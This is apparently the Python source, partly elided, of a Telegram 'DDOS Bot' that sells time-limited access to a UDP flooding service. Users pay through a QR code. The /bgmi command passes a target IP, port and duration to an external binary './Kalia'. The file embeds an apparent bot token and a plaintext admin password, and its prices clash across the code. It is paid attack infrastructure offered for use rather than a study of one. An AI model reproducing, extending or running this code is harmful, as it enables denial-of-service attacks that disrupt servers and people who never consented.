...
BOT_TOKEN = "76057552276:AAFhgd27ZQjULsl-fHQtpgWfhagq7vhktf"

# Admin password for /pass command
ADMIN_PASSWORD = "FRONTMAN"

# Payment details
PAYMENT_AMOUNT = 500  # 100 INR for 5 days access
...
def execute_binary(ip: str, port: int, time: int):
    try:
        command = ["./Kalia", ip, str(port), str(time)]
...
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("ð Welcome to the DDOS Bot! ð\n\n"
                                    "Use /razeem to send DDOS ATTACK.\n"
...
async def bgmi(update: Update, context: CallbackContext):
    ...
    if user_id not in user_access:
        await update.message.reply_text("â ï¸ You don't have access. Please pay â¹100 for 5 days access using /pay. CONTACT @KaliaYtOwner")
        return
    ...
    try:
        ...
        await update.message.reply_text(f"â ATTACK SUCCESUFFLY SENT to {ip}:{port} for {time} seconds.")
    except (IndexError, ValueError):
        await update.message.reply_text("â Invalid arguments. Usage: /bgmi <IP> <PORT> <TIME>")

async def help(update: Update, context: CallbackContext):
    await update.message.reply_text("ð Available Commands:\n\n"
                                    "/start - Start the bot\n"
                                    "/bgmi <IP> <PORT> <TIME> - Send UDP packets\n"
                                    "/pay - Pay â600 for 5 days access\n"
...
async def pay(update: Update, context: CallbackContext):
    ...
    qr.add_data(f"Pay â¹{PAYMENT_AMOUNT} for 5 days access.")
    qr.make(fit=True)
    ...
    await update.message.reply_text(f"ð² Scan the QR code to pay â¹{PAYMENT_AMOUNT}.\n"
...
async def handle_transaction_id(update: Update, context: CallbackContext):
    ...
    if transaction_id.strip():
        ...
        await update.message.reply_text("â Payment verified! You now have 5 days access.")
    else:
        await update.message.reply_text("â Invalid transaction ID. Please try again.")
...
async def pass_admin(update: Update, context: CallbackContext):
    ...
    try:
        ...
        if password == ADMIN_PASSWORD:
            ...
            await update.message.reply_text("ð Admin access granted!")
        else:
            await update.message.reply_text("â Incorrect password.")
    except IndexError:
        await update.message.reply_text("â Usage: /pass <PASSWORD>")

async def add_user(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in admin_users:
        await update.message.reply_text("â You don't have admin access.")
        return

    try:
        target_user_id = int(context.args[0])
        user_access[target_user_id] = True
        await update.message.reply_text(f"â User {target_user_id} added.")
    except (IndexError, ValueError):
        await update.message.reply_text("â Usage: /add <USER_ID>")
...
async def remove_user(update: Update, context: CallbackContext):
    ...
    try:
        ...
        if target_user_id in user_access:
            ...
            await update.message.reply_text(f"â User {target_user_id} removed.")
        else:
...
async def set_filter(update: Update, context: CallbackContext):
    ...
    try:
        ...
        await update.message.reply_text(f"â Filter '{filter_name}' set to: {message}")
    except IndexError:
        await update.message.reply_text("â Usage: /set <FILTER> <MESSAGE>")
...
async def trial(update: Update, context: CallbackContext):
    ...
    admin_message = f"ð¨ Trial Request ð¨\n\nUsername: @{username}\nUser ID: {user_id}\n\nRequirements: USER REQUIREMENTS FOR TRIAL"
    await context.bot.send_message(chat_id="8043962912", text=admin_message)
    await update.message.reply_text("â Your trial request has been sent to the admin. Please wait for approval.")
